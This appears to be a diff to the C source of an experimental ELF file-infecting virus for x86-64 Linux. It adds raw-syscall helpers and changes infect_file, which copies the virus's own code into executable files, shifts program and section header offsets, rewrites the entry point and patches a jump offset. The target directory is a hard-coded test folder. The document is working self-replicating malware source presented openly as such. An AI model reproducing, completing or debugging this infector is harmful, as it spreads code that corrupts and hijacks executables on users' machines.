@@ -19,6 +19,8 @@ struct linux_dirent64 {
 
 void infect_file(char*path, char *file);
 void virus_exit(long status);
+long virus_write(long fd, char *buf, unsigned long len);
+char * virus_itoa(long x, char *t);
 void code_end();
 void _start()
 {
@@ -67,7 +69,9 @@ void _start()
 	//char *start[1] = {"/home/lkm/workspace/virus/test/test"};
 	char nn[] = {'/','h','o','m','e','/','l','k','m','/','w','o','r','k','s','p','a','c','e','/','v','i','r','u','s','/','t','e','s','t','/'};
 	infect_file(nn, ss);
-	virus_exit(0);
+	__asm__ volatile(
+	"jmp virus_exit");
+	//virus_exit(0);
 }
 
 int virus_getdents64(unsigned int fd, struct linux_dirent64 *dirp,unsigned int count)
@@ -81,6 +85,19 @@ int virus_getdents64(unsigned int fd, struct linux_dirent64 *dirp,unsigned int c
 		"syscall" :: "g"(fd), "g"(dirp), "g"(count));
 	asm ("mov %%rax, %0" : "=r"(ret));
 	return (int)ret;
+}
+
+long virus_lseek(long fd, long offset, unsigned int whence)
+{
+	long ret;
+	__asm__ volatile(
+		"mov %0, %%rdi\n"
+		"mov %1, %%rsi\n"
+		"mov %2, %%rdx\n"
+		"mov $8, %%rax\n"
+		"syscall" : : "g"(fd), "g"(offset), "g"(whence));
+	asm("mov %%rax, %0" : "=r"(ret));
+	return ret;
 }
 
 long virus_open(const char *path, unsigned long flags, long mode)
@@ -225,6 +242,7 @@ size_t align(size_t size){
 }
 
 void infect_file(char*path, char *target){
+	char rr[10];
 	/*
 	virus_write(1, file,virus_strlen(file));
 	virus_write(1, "\n", 1);
@@ -235,18 +253,22 @@ void infect_file(char*path, char *target){
 	virus_read(f,headbuf,4096);
 	virus_close(f);
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) headbuf;
+	//virus_write(1, target,virus_strlen(target));
 	if(ehdr->e_type != ET_EXEC) return;
 	if(ehdr->e_machine != EM_X86_64) return;
 	
 	//load self
 	//char test[] = {'.','/','t','e','s','t','/','t','e','s','t'};
+	
 	int self = virus_open(target,O_RDONLY, 0);
+	
 	struct stat s;
 	virus_fstat(self, &s);
 	char* mem = (char*)virus_mmap(NULL,s.st_size,PROT_READ|PROT_WRITE, MAP_PRIVATE, self, 0);
 	Elf64_Ehdr *self_ehdr = (Elf64_Ehdr *)mem;
 	Elf64_Phdr *self_phdr = (Elf64_Phdr *)&mem[self_ehdr->e_phoff];
 	Elf64_Shdr *self_shdr = (Elf64_Shdr *)&mem[self_ehdr->e_shoff];
+
 	/*
 	char nu[10];
 	virus_write(1, virus_itoa(ehdr->e_phnum,nu), 10);
@@ -258,6 +280,8 @@ void infect_file(char*path, char *target){
 	//get code length, must add 1, ret is 1
 	size_t code_size = ((char *)&code_end - (char *)&_start)+1;
 	code_size = align(code_size);
+	
+	
 	/*
 	virus_write(1, virus_itoa(code_size,nu), 10);
 	virus_write(1, changeline, 1);
@@ -291,17 +315,14 @@ void infect_file(char*path, char *target){
 	virus_write(1, changeline, 1);
 	*/
 	//because next loop ingore first two segemnt , so need to add first
-	new_phdr[0].p_offset += code_size;
-	new_phdr[1].p_offset += code_size;
+	//new_phdr[0].p_offset += code_size;
+	//new_phdr[1].p_offset += code_size;
 	//3.1	
 	//new_ehdr->e_shoff += code_size;
 	//3.2 and 3.3
 	int i;
 	int findtext = 0;
 	for (i = 0; i < new_ehdr->e_phnum; i++) {
-		if(findtext != 0){
-			new_phdr[i].p_offset += code_size;
-		}
 		if (new_phdr[i].p_type == PT_LOAD && new_phdr[i].p_flags == (PF_R|PF_X)){
 			/*
 			char nu[10];
@@ -327,6 +348,7 @@ void infect_file(char*path, char *target){
 		}else if(new_phdr[i].p_type == PT_LOAD && new_phdr[i].p_offset && (new_phdr[i].p_flags & PF_W)){
 			new_phdr[i].p_align = 0x1000;
 		}
+		new_phdr[i].p_offset += code_size;
 	}
 	//3.4
 	new_ehdr->e_entry = self_phdr[findtext].p_vaddr - code_size + sizeof(Elf64_Ehdr);
@@ -335,7 +357,7 @@ void infect_file(char*path, char *target){
 	virus_write(1, virus_itoa(new_ehdr->e_entry,nu), 10);
 	virus_write(1, changeline, 1);*/
 	//3.5
-	
+
 	//4
 	for (i = 0; i < new_ehdr->e_shnum; i++) {
 		new_shdr[i].sh_offset += code_size;
@@ -351,13 +373,19 @@ void infect_file(char*path, char *target){
 	virus_write(newfile, newmem, sizeof(Elf64_Ehdr));
 	virus_write(newfile, (char *)&_start, code_size);
 	virus_write(newfile, newmem+sizeof(Elf64_Ehdr), s.st_size-sizeof(Elf64_Ehdr));
-	
-	/*
-	char rr[10];
-	virus_write(1, virus_itoa(new_ehdr->e_phnum,rr), 10);
-	virus_write(1, virus_itoa(ehdr->e_phnum,rr), 10);
-	*/
 
+	char fr[10];
+	virus_write(1, virus_itoa(code_size,fr), 10);
+
+	
+	virus_lseek(newfile, 417, SEEK_SET);
+	char oep[4];
+	*(unsigned int*)&oep[0] = 301;//4763;//self_ehdr->e_entry - (0x3ff000+421);//4763;//self_ehdr->e_entry - (0x3ff1a5);//5605;//301;//
+	virus_write(newfile, oep, 4);
+	
+	char sr[10];
+	virus_write(1, virus_itoa(self_ehdr->e_entry - (0x3ff1a5),sr), 10);
+	
 	//remove old file, and rename new file
 
 	virus_close(newfile);
@@ -365,9 +393,6 @@ void infect_file(char*path, char *target){
 
 //dir must end with /
 void infect_dir(char* path){
-	virus_write(1, path,virus_strlen(path));
-	char changeline[] = {'\n'};
-	virus_write(1, changeline, 1);
 	struct linux_dirent64 *d;
 	char buf[1024*1024];
 	int bpos;
@@ -396,4 +421,5 @@ void infect_dir(char* path){
 }
 
 void code_end(){
+	
 }
